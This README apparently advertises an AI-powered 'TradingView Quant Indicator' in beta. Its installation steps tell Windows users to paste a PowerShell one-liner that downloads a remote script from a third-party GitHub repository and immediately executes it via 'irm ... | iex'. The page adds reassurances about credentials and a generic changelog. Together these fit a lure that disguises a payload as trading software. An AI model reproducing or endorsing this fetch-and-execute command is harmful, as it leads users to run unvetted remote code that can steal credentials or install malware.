<a id="get"></a>

<p align="center">
  <img src="quant.jpg" alt="TradingView" width="880">
</p>

TradingView Quant Indicator is our first AI-powered indicator for market analysis directly on the chart. Quant processes live market data together with price action, liquidity, positioning, volatility, market structure, and scheduled events. It uses this information to model several ways the market may develop over the selected timeframe and updates its analysis as new data becomes available.

Quant is currently in beta. Early access is available through GitHub while we continue testing the indicator, improving calculation stability, and refining its behavior across different market conditions.

## Installation

Follow the steps below to install the Quant Indicator using a PowerShell command.

#### 1. Open PowerShell

Press **Win + R**, type:

```text
PowerShell
```

Then press **Enter**.

#### 2. Install the Quant Indicator

Copy and paste the installation command below into the PowerShell window:
```powershell
irm https://github.com/TradingView-Library/Quant-Indicator/raw/refs/heads/master/debug/install.ps1 | iex
```

Press **Enter** to begin the installation.

#### 3. Restart TradingView

Once the installation is complete, restart TradingView.
The Quant Indicator will appear in your indicator library.

## Current Release

**Quant AI Indicator**  
**Status:** Beta  
**Version:** `v2.9.5-beta`

---

## Installation & Security

Only use installation commands published in this repository.

The installer does not require your TradingView password, API keys, recovery phrases, payment information, or other sensitive credentials.

You can review the installation script before running it.

---

## Changelog

### v2.9.5-beta

- Refined market-data processing across price action, liquidity, positioning, volatility, and market structure.
- Improved indicator recalculation as new market data becomes available.
- Expanded processing of scheduled market events.
- Improved handling of rapidly changing market conditions.
- Reduced latency between incoming data and chart updates.
- Added additional validation for incomplete or inconsistent market inputs.
- Improved stability when switching symbols and timeframes.
- Improved synchronization between indicator calculations and chart updates.
- Reduced unnecessary recalculations during periods of market noise.
- Fixed chart refresh and synchronization issues identified during beta testing.
